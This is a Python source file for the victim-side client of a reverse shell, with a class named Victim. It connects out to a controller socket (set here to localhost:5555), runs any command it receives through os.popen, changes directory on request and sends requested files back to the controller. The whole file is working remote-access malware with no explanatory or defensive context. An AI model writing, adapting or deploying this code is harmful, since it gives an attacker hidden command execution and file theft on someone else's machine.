#!/usr/bin/env python3
# --*-- conding: utf-8 --*--

import socket
import threading
import os

ENCODAGE = 'utf-8'
BUFFERSIZE = 1024
HOST = 'localhost'
PORT = 5555

class Victim(threading.Thread):
	def __init__(self, socket):
		threading.Thread.__init__(self)
		self.socket = socket
		self.command = None
		self.response = None

	def send(self, message):
		if self.socket is not None:
			self.socket.send(message.encode(ENCODAGE))

	def get_prompt(self):
		return str(os.popen('pwd').read()[:-1])+"> "

	def run(self):
		self.send(self.get_prompt())
		
		while True:
			try:
				self.command = self.socket.recv(BUFFERSIZE).decode(ENCODAGE)

				if self.command[:2] == 'cd':
					if os.path.exists(os.path.abspath(self.command[3:])):
						# send the message to server
						self.send("chdir")
						# change the current directory
						os.chdir(self.command[3:]) 
						# send prompt to the server
						self.send(self.get_prompt())
						continue
					
					else:
						self.send("not_found")
						continue

				elif self.command == 'exit' or self.command == 'quit':
					self.send("quit")
					break

				elif self.command[:8] == "download":
					file_abspath = os.path.abspath(self.command[9:])
					
					if os.path.exists(file_abspath):
						self.socket.send('found'.encode(ENCODAGE))
						with open(file_abspath, 'rb') as file_to_send:
							self.socket.sendfile(file_to_send)
						continue
					
					else:
						self.send('not_found')
						continue

				else:
					self.response = os.popen(str(self.command)).read()
					self.socket.sendall(self.response.encode(ENCODAGE))
					continue

			except:
				break

		self.socket.close()
		exit()


try:
	socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket.connect((HOST, PORT))
	victim = Victim(socket)
	victim.start()

except Exception as e:
	exit()
